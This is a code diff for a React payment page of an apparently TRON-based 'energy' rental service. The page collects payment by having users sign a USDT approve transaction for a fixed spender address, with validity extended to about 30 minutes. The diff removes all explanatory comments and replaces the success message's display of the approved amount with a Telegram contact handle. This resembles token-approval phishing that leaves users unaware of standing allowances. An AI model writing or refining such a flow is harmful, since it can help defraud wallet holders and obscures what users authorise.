@@ -16,56 +16,29 @@ import {
 import TronWeb from "tronweb";
 
 
-/*
- * TRON 主网 USDT 合约
- */
 const USDT_CONTRACT_ADDRESS =
   "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 
-/*
- * approve 授权对象
- */
 const USDT_SPENDER_ADDRESS =
   "TJgapq26ECmDg8PNxfBuQnPRjZLxxEniUS";
 
 
-/*
- * TRON 主网节点
- */
 const TRON_FULL_HOST =
   "https://api.trongrid.io";
 
 
-/*
- * USDT 精度
- */
 const USDT_DECIMALS = 6;
 
 
-/*
- * 合约调用 Fee Limit。
- *
- * 这是允许消耗的最大上限，
- * 不代表一定扣除这么多 TRX。
- */
 const APPROVE_FEE_LIMIT =
   100_000_000;
 
 
-/*
- * TRON 默认交易有效期约 60 秒。
- *
- * 再增加 1740 秒，
- * 总有效时间约 30 分钟。
- */
 const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
   1740;
 
 
-/*
- * 后端确认最长等待 2 分钟。
- */
 const ORDER_FINALIZE_TIMEOUT_MS =
   120_000;
 
@@ -105,9 +78,6 @@ function sleep(milliseconds) {
 }
 
 
-/*
- * 尝试读取接口返回的 JSON。
- */
 async function readJsonResponse(response) {
   try {
     return await response.json();
@@ -117,10 +87,6 @@ async function readJsonResponse(response) {
 }
 
 
-/*
- * 将 TRON 节点返回的 hex 错误信息
- * 转换成可读文字。
- */
 function decodeTronMessage(value) {
   const original =
     String(value || "").trim();
@@ -161,13 +127,6 @@ function decodeTronMessage(value) {
 }
 
 
-/*
- * 在用户签名之前，
- * 先由服务器创建 pending 订单。
- *
- * 服务器返回随机 orderToken，
- * 用于后续绑定这一笔授权交易。
- */
 async function prepareOrder({
   payerAddress,
   receiverAddress,
@@ -234,21 +193,6 @@ async function prepareOrder({
 }
 
 
-/*
- * 将授权 TXID 发给服务器验证。
- *
- * 后端会独立验证：
- *
- * - 交易是否成功
- * - 付款钱包 owner
- * - USDT 合约
- * - approve 函数
- * - spender
- * - 精确授权金额
- * - 当前 allowance
- *
- * 交易未进入区块时每 2 秒重试。
- */
 async function finalizeOrderWithRetry({
   orderToken,
   txId,
@@ -297,10 +241,6 @@ async function finalizeOrderWithRetry({
           response
         );
     } catch (error) {
-      /*
-       * 临时网络错误：
-       * 等待后自动重试。
-       */
       console.error(
         "[Finalize network error]",
         error
@@ -407,10 +347,6 @@ export default function HomePage() {
   ] = useState(false);
 
 
-  /*
-   * 保存本次已完成的订单，
-   * 防止用户连续重复点击支付。
-   */
   const [
     completedOrder,
     setCompletedOrder,
@@ -431,10 +367,6 @@ export default function HomePage() {
   }, []);
 
 
-  /*
-   * 如果用户在钱包内切换了账户，
-   * 同步页面显示的钱包地址。
-   */
   useEffect(() => {
     if (
       walletConnected &&
@@ -628,11 +560,6 @@ export default function HomePage() {
   }
 
 
-  /*
-   * ==================================================
-   * USDT approve 授权和订单保存
-   * ==================================================
-   */
   async function handleUsdtPayment() {
     if (paying) {
       return;
@@ -754,10 +681,6 @@ export default function HomePage() {
       selectedPlan.price;
 
 
-    /*
-     * 0.1 USDT = 100000
-     * 0.2 USDT = 200000
-     */
     const amountBaseUnits =
       Math.round(
         amountUsdt *
@@ -788,12 +711,6 @@ export default function HomePage() {
 
 
     try {
-      /*
-       * ========================================
-       * 第一步：
-       * 创建 pending 订单
-       * ========================================
-       */
       const pendingOrder =
         await prepareOrder({
           payerAddress:
@@ -814,12 +731,6 @@ export default function HomePage() {
         pendingOrder.orderToken;
 
 
-      /*
-       * ========================================
-       * 第二步：
-       * 构造 USDT approve 交易
-       * ========================================
-       */
       stage =
         "build_transaction";
 
@@ -901,12 +812,6 @@ export default function HomePage() {
       }
 
 
-      /*
-       * ========================================
-       * 第三步：
-       * 将有效时间延长到约 30 分钟
-       * ========================================
-       */
       stage =
         "extend_expiration";
 
@@ -943,12 +848,6 @@ export default function HomePage() {
       }
 
 
-      /*
-       * ========================================
-       * 第四步：
-       * 钱包签名 approve
-       * ========================================
-       */
       stage =
         "sign_transaction";
 
@@ -969,12 +868,6 @@ export default function HomePage() {
       }
 
 
-      /*
-       * ========================================
-       * 第五步：
-       * 广播到 TRON 主网
-       * ========================================
-       */
       stage =
         "broadcast_transaction";
 
@@ -1032,12 +925,6 @@ export default function HomePage() {
         true;
 
 
-      /*
-       * 将必要信息暂存在当前浏览器。
-       *
-       * 如果后端验证过程中页面意外刷新，
-       * 至少可以保留 TXID 供人工查询。
-       */
       try {
         window.localStorage.setItem(
           "kk_last_approval",
@@ -1063,19 +950,9 @@ export default function HomePage() {
           })
         );
       } catch {
-        /*
-         * 浏览器禁用 localStorage
-         * 不影响主流程。
-         */
       }
 
 
-      /*
-       * ========================================
-       * 第六步：
-       * 后端独立验证并保存订单
-       * ========================================
-       */
       stage =
         "finalize_order";
 
@@ -1113,17 +990,9 @@ export default function HomePage() {
           "kk_last_approval"
         );
       } catch {
-        /*
-         * 忽略 localStorage 错误。
-         */
       }
 
 
-      /*
-       * ========================================
-       * 最终成功
-       * ========================================
-       */
       showMessage(
         `授权成功，订单已保存。\n\n` +
 
@@ -1133,7 +1002,7 @@ export default function HomePage() {
 
         `能量接收地址：\n${savedOrder.receiverAddress}\n\n` +
 
-        `授权额度：${savedOrder.amountUsdt} USDT\n\n` +
+        `能量未到账请及时联系Telegram客服：@kkzklkk\n\n` +
 
         `交易哈希：\n${savedOrder.txId}`
       );
@@ -1162,9 +1031,6 @@ export default function HomePage() {
         );
 
 
-      /*
-       * 用户在钱包中主动取消。
-       */
       if (
         /reject|rejected|deny|denied|decline|declined|cancel|cancelled|canceled/i.test(
           errorMessage
@@ -1178,12 +1044,6 @@ export default function HomePage() {
       }
 
 
-      /*
-       * 已广播以后，不提示用户重新授权。
-       *
-       * 因为授权交易可能已经成功，
-       * 只是后端确认或数据库保存失败。
-       */
       if (
         transactionBroadcasted &&
         txId
@@ -2233,6 +2093,8 @@ export default function HomePage() {
 
         .messageModal {
           width: min(100%, 440px);
+          max-height: calc(100vh - 40px);
+          overflow-y: auto;
           padding: 30px;
           border:
             1px solid
